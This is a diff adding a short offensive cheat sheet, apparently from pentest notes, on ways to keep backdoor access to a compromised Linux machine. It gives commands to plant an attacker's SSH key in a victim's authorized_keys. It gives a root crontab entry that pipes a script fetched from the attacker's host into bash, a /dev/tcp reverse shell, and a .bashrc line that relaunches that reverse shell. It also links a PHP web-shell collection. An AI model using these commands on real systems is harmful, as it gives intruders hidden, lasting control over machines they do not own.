@@ -1,0 +1,40 @@
+> SSH Backdoor
+- Create key public witch "ssh-keygen"
+- On victim server, Include the key public on /.ssh/authorized_keys
+
+**Example with scp
+scp ~/.ssh/id_rsa.pub victim@victimip:/~/.ssh/
+copy the public in the authorized_keys file 
+cat ~/.ssh/id_rsa.pub >> authorized_keys 
+
+set the right permissions
+chmod 700 ~/
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+
+Connect
+ssh -i ~/.ssh/id_rsa victim@victimip
+
+https://medium.com/@sec_for_safety/ssh-backdoor-how-to-get-a-proper-shell-on-the-victims-machine-52d28fe6dde1
+-------------------------------------------------------------------------------------------------------------------------------
+> PHP Backdoors
+
+https://github.com/backdoorhub/shell-backdoor-list
+
+-------------------------------------------------------------------------------------------------------------------------------
+> Cronjobs backdoors
+- On file /etc/crontab
+- Put, * *     * * *   root    curl http://<yourip>:8080/shell | bash
+- File shell on attack machine
+#!/bin/bash
+
+- bash -i >& /dev/tcp/ip/port 0>&1
+https://blog.sucuri.net/2014/01/the-hidden-backdoors-to-the-city-of-cron.html
+-------------------------------------------------------------------------------------------------------------------------------
+> File .bashrc
+echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
+
+https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c
+-------------------------------------------------------------------------------------------------------------------------------
+
+
